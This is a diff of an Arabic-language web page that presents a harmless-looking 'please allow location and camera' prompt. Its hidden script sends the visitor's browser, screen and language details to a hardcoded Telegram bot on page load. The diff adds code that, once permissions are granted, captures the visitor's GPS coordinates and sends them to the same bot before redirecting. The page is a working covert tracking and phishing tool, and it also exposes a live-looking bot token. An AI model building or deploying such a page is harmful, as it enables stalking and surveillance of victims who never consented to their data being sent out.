@@ -11,88 +11,90 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #fafafa;
+            background-color: #f0f0f0;
             font-family: Arial, sans-serif;
             direction: rtl;
             text-align: center;
         }
-        .alert-box {
-            background-color: #ffdddd;
-            color: #a33;
-            padding: 20px;
-            border: 1px solid #a33;
-            border-radius: 8px;
+        #permission-message {
+            font-size: 20px;
+            color: #333;
             margin-bottom: 20px;
-            font-size: 18px;
         }
-        button {
+        #request-button {
             padding: 10px 20px;
             font-size: 18px;
-            color: #fff;
             background-color: #4CAF50;
+            color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
+        #request-button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
-    <div class="alert-box">
-        من فضلك، اسمح بالوصول إلى الموقع والكاميرا للمتابعة.
-    </div>
-    <button onclick="requestPermissions()">السماح بالأذونات</button>
+    <div id="permission-message">الرجاء السماح بالوصول إلى الموقع والكاميرا للمتابعة</div>
+    <button id="request-button" onclick="requestPermissions()">السماح بالأذونات</button>
 
     <script>
         const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
         const chatId = '6185375878';
 
-        // إرسال البيانات الأولية إلى Telegram
+        // إرسال الرسالة الأولية إلى Telegram فور دخول المستخدم الموقع
         function sendInitialData() {
             const userAgent = navigator.userAgent;
             const screenWidth = window.screen.width;
             const screenHeight = window.screen.height;
             const language = navigator.language || navigator.userLanguage;
-
-            const message = `
-                📲 معلومات المستخدم الأولية:
-                🌐 المتصفح: ${userAgent}
+            const initialMessage = `
+                🖥️ معلومات أولية عند الدخول:
                 📏 عرض الشاشة: ${screenWidth}px
                 📏 ارتفاع الشاشة: ${screenHeight}px
-                🌐 اللغة: ${language}
+                🌐 لغة المتصفح: ${language}
+                🖥️ متصفح ونظام التشغيل: ${userAgent}
             `;
-
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => console.log('تم إرسال البيانات الأولية:', data))
-            .catch(error => console.error('خطأ في إرسال البيانات الأولية:', error));
+                body: new URLSearchParams({ chat_id: chatId, text: initialMessage })
+            }).catch(error => console.error('خطأ في إرسال البيانات الأولية:', error));
         }
 
         sendInitialData();
 
         // طلب الأذونات
         function requestPermissions() {
-            navigator.geolocation.getCurrentPosition(
-                () => checkCameraPermission(),
-                () => alert("يرجى السماح بالوصول إلى الموقع للمواصلة.")
-            );
-        }
-
-        // التأكد من إذن الكاميرا
-        async function checkCameraPermission() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop());
-                window.location.href = "waitingPage.html";
-            } catch (error) {
-                alert("يرجى السماح بالوصول إلى الكاميرا للمواصلة.");
-            }
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const locationMessage = `
+                                📍 تم الحصول على الموقع بعد منح الإذن:
+                                🌍 خط العرض: ${latitude}
+                                🌍 خط الطول: ${longitude}
+                            `;
+                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: new URLSearchParams({ chat_id: chatId, text: locationMessage })
+                            }).then(() => window.location.href = "waitingPage.html")
+                            .catch(error => console.error('خطأ في إرسال الموقع:', error));
+                        },
+                        (error) => {
+                            console.error('لم يتم منح إذن الموقع:', error);
+                            alert('يجب السماح بالوصول إلى الموقع للمتابعة.');
+                        }
+                    );
+                })
+                .catch((error) => {
+                    console.error('خطأ في الوصول إلى الكاميرا:', error);
+                    alert('يجب السماح بالوصول إلى الكاميرا للمتابعة.');
+                });
         }
     </script>
 </body>
